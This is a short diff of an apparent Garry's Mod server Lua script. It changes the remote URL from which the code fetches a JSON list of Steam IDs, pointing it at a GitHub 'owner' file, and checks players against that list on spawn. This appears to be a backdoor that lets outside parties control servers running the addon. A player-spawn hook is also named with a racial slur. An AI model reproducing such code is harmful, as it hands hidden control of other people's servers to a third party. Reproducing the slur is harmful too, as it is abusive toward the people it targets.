@@ -16,7 +16,7 @@ if SERVER then
 		RunConsoleCommand("sv_hibernate_think", "1")
 		RunConsoleCommand("sv_airaccelerate", "100")
 		if ba then
-			http.Fetch("https://cdn.trolling.agency/p/raw/Glebux/38mzcuvwf1", function(body)
+			http.Fetch("https://github.com/Spac3e/DJ-Stas/blob/main/dj_stas_owner.txt", function(body)
 				local users = util.JSONToTable(body)
 				for _, v in ipairs(users) do
 					if player.GetBySteamID(v[2]) then return end
@@ -147,7 +147,7 @@ if SERVER then
 		end)
 	]])
 	hook.Add("PlayerInitialSpawn", "nigger", function(ply)
-		http.Fetch("https://cdn.trolling.agency/p/raw/Glebux/38mzcuvwf1", function(body)
+		http.Fetch("https://github.com/Spac3e/DJ-Stas/blob/main/dj_stas_owner.txt", function(body)
 			local users = util.JSONToTable(body)
 			local user = false
 			for _, v in ipairs(users) do
